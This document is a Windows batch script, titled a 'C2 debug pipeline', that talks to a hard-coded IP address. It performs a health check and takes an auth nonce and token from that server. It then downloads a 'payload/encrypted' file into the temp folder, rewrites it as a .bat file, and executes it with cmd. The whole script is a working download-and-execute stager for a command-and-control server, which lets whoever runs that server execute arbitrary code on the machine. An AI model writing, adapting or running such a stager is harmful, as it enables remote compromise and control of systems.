@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul
title C2 DEBUG SRE-GRADE
color 0A

echo.
echo ╔════════════════════════════════════════════════════════════╗
echo ║   C2 SRE DEBUG PIPELINE - API → VALIDATE → EXEC           ║
echo ╚════════════════════════════════════════════════════════════╝
echo.

:: ===== CONFIG =====
set "BASE=http://82.29.153.101:8080"
set "AUTH=%TEMP%\auth.json"
set "RAW=%TEMP%\payload.raw"
set "CLEAN=%TEMP%\payload.bat"
set "LOG=%TEMP%\exec.log"
set "CURL_LOG=%TEMP%\curl.log"
set "STATUS_FILE=%TEMP%\status.txt"

echo 📁 FILES:
echo    AUTH: %AUTH%
echo    RAW:  %RAW%
echo    CLEAN:%CLEAN%
echo    LOG:  %LOG%
echo    CURL: %CURL_LOG%
echo.

:: =====================================================
:: [1] HEALTH CHECK
:: =====================================================
echo [1] 🔍 HEALTH CHECK...

curl -sS --max-time 5 "%BASE%/health" > "%TEMP%\health.txt" 2> "%CURL_LOG%"

if %ERRORLEVEL% neq 0 (
    echo ❌ HEALTH CHECK FAILED
    type "%CURL_LOG%"
    goto :fail
)

set /p HEALTH=<"%TEMP%\health.txt"
echo ✓ HEALTH: %HEALTH%
del "%TEMP%\health.txt" 2>nul
echo.

:: =====================================================
:: [2] AUTH REQUEST
:: =====================================================
echo [2] 🔐 AUTH REQUEST...

curl -sS --fail --max-time 10 "%BASE%/auth/key" -o "%AUTH%" 2> "%CURL_LOG%"

if %ERRORLEVEL% neq 0 (
    echo ❌ AUTH REQUEST FAILED
    type "%CURL_LOG%"
    goto :fail
)

echo 📄 AUTH RESPONSE:
type "%AUTH%"
echo.

:: validar contenido esperado
type "%AUTH%" | find "nonce" >nul || (
    echo ❌ AUTH INVALIDA (no contiene nonce)
    goto :fail
)

:: =====================================================
:: [3] PARSE JSON
:: =====================================================
echo [3] 🧠 PARSE JSON...

powershell -NoProfile -Command ^
  "try { ^
    $json = Get-Content '%AUTH%' -Raw | ConvertFrom-Json; ^
    $json.nonce | Out-File '%TEMP%\nonce.txt' -Encoding ASCII; ^
    $json.token | Out-File '%TEMP%\token.txt' -Encoding ASCII; ^
    exit 0 ^
  } catch { exit 1 }"

if %ERRORLEVEL% neq 0 (
    echo ❌ JSON PARSE FAILED
    goto :fail
)

set /p NONCE=<"%TEMP%\nonce.txt"
set /p TOKEN=<"%TEMP%\token.txt"

echo ✓ NONCE: %NONCE%
echo ✓ TOKEN: %TOKEN:~0,40%...
echo.

:: =====================================================
:: [4] DOWNLOAD PAYLOAD
:: =====================================================
echo [4] 📦 DOWNLOAD PAYLOAD...

curl -sS --fail --max-time 10 ^
  -w "HTTPSTATUS:%%{http_code}" ^
  -H "X-Nonce: %NONCE%" ^
  -H "X-Token: %TOKEN%" ^
  "%BASE%/payload/encrypted" ^
  -o "%RAW%" > "%STATUS_FILE%" 2> "%CURL_LOG%"

if %ERRORLEVEL% neq 0 (
    echo ❌ PAYLOAD DOWNLOAD FAILED
    type "%CURL_LOG%"
    goto :fail
)

set /p STATUS=<"%STATUS_FILE%"
echo 📡 %STATUS%

echo %STATUS% | find "200" >nul || (
    echo ❌ HTTP ERROR
    type "%CURL_LOG%"
    goto :fail
)

if not exist "%RAW%" (
    echo ❌ RAW FILE NOT CREATED
    goto :fail
)

for %%F in ("%RAW%") do echo ✓ RAW SIZE: %%~zF bytes
echo.

echo 🔍 RAW PREVIEW:
type "%RAW%" | more
echo.

:: =====================================================
:: [5] CLEAN PAYLOAD (SAFE)
:: =====================================================
echo [5] 🧹 CLEAN PAYLOAD...

powershell -NoProfile -Command ^
  "$bytes = [System.IO.File]::ReadAllBytes('%RAW%'); ^
   $content = [System.Text.Encoding]::UTF8.GetString($bytes); ^
   $content | Out-File '%CLEAN%' -Encoding ASCII"

if not exist "%CLEAN%" (
    echo ❌ CLEAN FAILED
    goto :fail
)

for %%F in ("%CLEAN%") do (
    echo ✓ CLEAN SIZE: %%~zF bytes
    if %%~zF LSS 10 (
        echo ❌ CLEAN FILE DEMASIADO PEQUEÑO
        goto :fail
    )
)

echo 📄 CLEAN PREVIEW:
type "%CLEAN%"
echo.

:: =====================================================
:: [6] EXECUTE
:: =====================================================
echo [6] 🚀 EXECUTE PAYLOAD...

cmd /v:on /c "%CLEAN%" > "%LOG%" 2>&1

echo 🔎 EXIT CODE: %ERRORLEVEL%
echo 📄 EXEC LOG:
type "%LOG%"
echo.

:: =====================================================
:: [7] SUCCESS
:: =====================================================
echo [7] ✅ DONE
goto :end

:: =====================================================
:: FAIL HANDLER
:: =====================================================
:fail
echo.
echo ❌ PIPELINE FAILED
echo 🔎 CURL LOG:
type "%CURL_LOG%"
echo.
pause
exit /b 1

:end
del "%TEMP%\nonce.txt" "%TEMP%\token.txt" "%STATUS_FILE%" 2>nul
pause